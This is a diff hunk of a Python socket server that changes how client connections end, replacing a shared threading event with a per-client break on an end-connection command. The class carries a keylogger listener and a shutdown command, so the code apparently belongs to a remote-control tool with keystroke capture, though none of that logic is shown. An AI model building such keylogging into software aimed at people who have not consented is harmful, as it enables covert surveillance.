@@ -43,33 +43,27 @@ class Server:
     self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     self.server.bind(self.addr)
     self.keylogger_listener = None
-    self.end_conn = threading.Event()
 
   def run(self):
     self.server.listen(5)
     print(f'Server is listening on {self.host}:{self.port}')
     while True:
         conn, addr = self.server.accept()
-        thread = threading.Thread(target=self.handle_client, args=(conn, addr, self.end_conn,), daemon=True)
+        thread = threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True)
         thread.start()
 
   # Handle client connection
-  def handle_client(self, conn, addr, end_conn):
+  def handle_client(self, conn, addr):
     lock = 0
     print(f"[NEW CONNECTION] {addr} connected.")
     connected = True
     try:
       while connected:
-        # If client sends 'end_connection' command, close connection
-        if end_conn.is_set():
-          connected = False
-          break
-
         data = conn.recv(BUFFER_SIZE)
 
         # End connection
         if data == CMD_END_CONNECTION.encode():
-          end_conn.set()
+          break
 
         # Shutdown
         elif data == CMD_SHUTDOWN.encode():
